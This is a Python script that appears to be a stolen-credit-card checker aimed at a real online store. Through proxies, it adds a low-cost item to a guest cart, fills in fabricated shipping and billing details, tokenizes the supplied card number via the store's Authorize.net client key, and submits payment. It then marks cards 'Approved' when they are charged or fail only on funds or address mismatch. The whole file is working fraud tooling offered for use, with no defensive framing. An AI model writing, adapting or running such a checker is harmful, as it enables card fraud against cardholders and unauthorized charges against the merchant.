from httpx import AsyncClient
import string
import random
def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"

async def authnet(cc, mes, ano, cvv, proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
        req = await session.get('https://www.jondon.com/microfiber-hand-trowel.html')
        form_key = req.text.split('name="form_key" type="hidden" value="')[1].split('"')[0]

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://www.jondon.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.jondon.com/microfiber-hand-trowel.html',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'product': '11094',
            'selected_configurable_option': '',
            'related_product': '',
            'item': '11094',
            'form_key': form_key,
            'qty': '1',
        }

        cookies = {'form_key': form_key}

        req2 = await session.post(
            f'https://www.jondon.com/checkout/cart/add/uenc/{form_key}/product/11094/',
            headers=headers,
            data=data,
            cookies=cookies
        )
        #print(req2.text)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.jondon.com/microfiber-hand-trowel.html',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }

        req3 = await session.get('https://www.jondon.com/checkout/', cookies=cookies, headers=headers)
        #print(req3.text)
        entity_id = req3.text.split('"entity_id":"')[1].split('"')[0]
        
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.jondon.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.jondon.com/checkout/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'addressInformation': {
                'shipping_address': {
                    'countryId': 'US',
                    'regionId': '41',
                    'regionCode': 'NJ',
                    'region': 'New Jersey',
                    'street': ['103-105 Central Avenue', ''],
                    'company': 'Hunter',
                    'telephone': '505-994-7000',
                    'postcode': '07050-3824',
                    'city': 'Orange',
                    'firstname': 'Sebastian',
                    'lastname': 'Gutierrez',
                    'customAttributes': [{
                        'attribute_code': 'industry_type',
                        'value': '1928',
                    }],
                    'extensionAttributes': {
                        'industry_type': '1928',
                        'lift_gate_required': 'no',
                        'inside_delivery': 'no',
                        'contact_delivery': 'no',
                        'warehouse_id': '11',
                        'pickup_notes': '',
                        'region_id': '62',
                        'pickup_date': '2024-09-16',
                        'pickup_time': '0',
                    },
                },
                'billing_address': {
                    'countryId': 'US',
                    'regionId': '41',
                    'regionCode': 'NJ',
                    'region': 'New Jersey',
                    'street': ['103-105 Central Avenue', ''],
                    'company': 'Hunter',
                    'telephone': '505-994-7000',
                    'postcode': '07050-3824',
                    'city': 'Orange',
                    'firstname': 'Sebastian',
                    'lastname': 'Gutierrez',
                    'customAttributes': [{
                        'attribute_code': 'industry_type',
                        'value': '1928',
                    }],
                    'extensionAttributes': {
                        'industry_type': '1928',
                        'lift_gate_required': 'no',
                        'inside_delivery': 'no',
                        'contact_delivery': 'no',
                        'warehouse_id': '11',
                        'pickup_notes': '',
                        'region_id': '62',
                        'pickup_date': '2024-09-16',
                        'pickup_time': '0',
                    },
                    'saveInAddressBook': None,
                },
                'shipping_method_code': 'summapickshipping',
                'shipping_carrier_code': 'summapickshipping',
                'extension_attributes': {},
            },
        }

        req4 = await session.post(
            f'https://www.jondon.com/rest/default/V1/guest-carts/{entity_id}/shipping-information',
            headers=headers,
            json=json_data,
        )

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://www.jondon.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.jondon.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '8Lt6tptF6Qqx',
                    'clientKey': '83YNaWuuKp9ykAe7VEfuSGNZgN985T2QLfX39Wz4Rk786a8njza5rvK9Yr24RvZB',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': 'd4761705-ed92-0c1c-646c-886654fe5c42',
                    'token': {
                        'cardNumber': cc,
                        'expirationDate': str(mes).zfill(2) + str(ano),
                    },
                },
            },
        }

        req5 = await session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
        tokenvalue = req5.text.split('"dataValue":"')[1].split('"')[0]

        one = cc[0:1]
        if one == "4":
            cc_type = "VI"  
        elif one == "5":
            cc_type = "MC"  
        elif one == "3":
            cc_type = "AE"  
        elif one == "6":
            cc_type = "DC"  

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.jondon.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.jondon.com/checkout/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'cartId': entity_id,
            'billingAddress': {
                'countryId': 'US',
                'regionId': '41',
                'regionCode': 'NJ',
                'region': 'New Jersey',
                'street': ['103-105 Central Avenue', ''],
                'company': 'Hunter',
                'telephone': '505-994-7000',
                'postcode': '07050-3824',
                'city': 'Orange',
                'firstname': 'Sebastian',
                'lastname': 'Gutierrez',
                'customAttributes': [{
                    'attribute_code': 'industry_type',
                    'value': '1928',
                }],
                'extensionAttributes': {
                    'industry_type': '1928',
                    'lift_gate_required': 'no',
                    'inside_delivery': 'no',
                    'contact_delivery': 'no',
                    'warehouse_id': '13',
                    'pickup_notes': '',
                    'region_id': '18',
                    'pickup_date': '2024-09-16',
                    'pickup_time': '0',
                },
                'saveInAddressBook': None,
            },
            'paymentMethod': {
                'method': 'authnetcim',
                'additional_data': {
                    'save': False,
                    'cc_type': cc_type,
                    'cc_exp_year': ano,
                    'cc_exp_month': str(int(mes)),
                    'card_id': None,
                    'acceptjs_key': 'COMMON.ACCEPT.INAPP.PAYMENT',
                    'acceptjs_value': tokenvalue,
                },
            },
            'email': random_email(),
        }

        req6 = await session.post(
            f'https://www.jondon.com/rest/default/V1/guest-carts/{entity_id}/payment-information',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        req7 = req6.text
        print(req7)
    if "true" in req7 or '"message":"' not in req7:
        response = "Charged 6.97$"
        status = "Approved ✅"
    else:
        response = req7.split('"message":"')[1].split('"')[0]

        if "Insufficient Funds" in response:
            status = "Approved ✅"
        elif "The transaction has been declined because of an AVS mismatch" in response:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

    return status,response
